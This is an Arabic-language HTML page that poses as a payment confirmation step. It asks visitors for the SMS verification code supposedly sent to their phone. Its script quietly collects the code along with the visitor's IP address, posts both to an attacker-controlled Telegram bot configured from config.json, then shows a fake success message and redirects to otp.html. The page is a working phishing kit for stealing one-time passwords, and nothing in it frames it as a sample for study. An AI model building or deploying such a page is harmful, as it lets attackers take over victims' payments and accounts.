<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تأكيد الدفع</title>
  <!-- Bootstrap RTL -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    body {
      font-family: "Cairo", sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: linear-gradient(-45deg, rgba(255,153,153,0.9), rgba(255,77,77,0.9), rgba(255,51,51,0.9), rgba(179,0,0,0.9));
      animation: gradientBG 12s ease infinite;
    }
    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }
    .container-box {
      background: #fff;
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      text-align: center;
    }
    h1 {
      color: #d10000;
      font-weight: 700;
      margin-bottom: 25px;
    }
    label {
      font-weight: bold;
      margin-top: 15px;
      display: block;
    }
    input {
      width: 100%;
      padding: 12px;
      border: 2px solid #ddd;
      border-radius: 12px;
      font-size: 16px;
      text-align: center;
      transition: 0.3s;
    }
    input:focus {
      border-color: #d10000;
      outline: none;
      box-shadow: 0 0 8px rgba(209,0,0,0.4);
    }
    button {
      margin-top: 25px;
      background: linear-gradient(45deg, #d10000, #b30000);
      color: white;
      border: none;
      padding: 15px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
      transition: 0.3s;
    }
    button:hover {
      opacity: 0.9;
      transform: scale(1.03);
    }
    .message {
      margin-top: 10px;
      padding: 10px;
      border-radius: 8px;
      display: none;
      font-size: 15px;
    }
    .info { background: #e7f3ff; color: #004085; border: 1px solid #b8daff; }
    .error { background: #ffd4d4; color: #900; }
    .success { background: #d4ffd8; color: #060; }
    footer {
      text-align: center;
      padding: 15px;
      color: white;
      font-size: 14px;
      background: rgba(0,0,0,0.3);
    }
  </style>
</head>
<body class="d-flex flex-column min-vh-100">

  <main class="flex-grow-1 d-flex align-items-center">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-12 col-md-6 col-lg-5">
          <div class="container-box">
            <h1>تأكيد الدفع</h1>

            <!-- إشعار إرسال رمز التحقق -->
            <div id="infoMsg" class="message info" style="display:block;">
              📩 تم إرسال رمز التحقق إلى هاتفك، يرجى إدخاله أدناه
            </div>

            <div id="msg" class="message"></div>

            <label>أدخل رمز التحقق</label>
            <input type="text" id="verificationCode" placeholder="" maxlength="6">

            <button onclick="verifyPayment()">تأكيد الدفع</button>
          </div>
        </div>
      </div>
    </div>
  </main>

  <footer>
    جميع الحقوق محفوظة © 2025
  </footer>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

  <script>
  async function verifyPayment() {
  const code = document.getElementById("verificationCode").value.trim();
  const msg = document.getElementById("msg");
  msg.style.display = "none";

  // تحقق من رمز التحقق
  if (!/^\d{4,6}$/.test(code)) {
    showMessage(msg, "يرجى إدخال رمز تحقق صالح (4 إلى 6 أرقام)", "error");
    return;
  }

  let info = { verificationCode: code, date: new Date().toLocaleString('ar-EG') };

  try {
    // جلب بيانات IP
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();
    info.ip = data.ip;

    // قراءة التوكن و chatId من config.json
    const configRes = await fetch("config.json");
    if (!configRes.ok) throw new Error("فشل تحميل config.json");
    const config = await configRes.json();
    const BOT_TOKEN = config.botToken;
    const CHAT_ID = config.chatId;

    const text = `💳 تأكيد الدفع:
🔢 رمز التحقق: ${info.verificationCode}
🌐 IP: ${info.ip}
⏰ ${info.date}`;

    // إرسال الرسالة لتليجرام باستخدام form-urlencoded
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ chat_id: CHAT_ID, text: text })
    });

    showMessage(msg, "✅ تم تأكيد الدفع بنجاح! جاري التحويل...", "success");

    setTimeout(() => {
      window.location.href = "otp.html";
    }, 3000);

  } catch (e) {
    console.error(e);
    showMessage(msg, "⚠️ حدث خطأ أثناء التحقق. حاول مرة أخرى", "error");
  }
}

// دالة مساعدة لعرض الرسائل
function showMessage(element, text, type) {
  element.className = `message ${type}`;
  element.textContent = text;
  element.style.display = "block";
}

  </script>
</body>
</html>
